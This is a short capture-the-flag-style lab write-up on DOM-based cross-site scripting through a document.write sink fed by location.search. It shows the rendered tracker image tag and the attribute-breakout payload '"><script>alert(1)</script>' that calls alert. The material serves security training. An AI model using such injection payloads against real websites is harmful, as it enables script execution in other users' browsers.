Lab #3 – DOM XSS in document.write sink using source location.search

Target Goal - Exploit the DOM-based XSS vulnerability to call the alert function.

Analysis:


<img src="/resources/images/tracker.gif?searchTerms=123456"><script>alert(1)</script>">


"><script>alert(1)</script>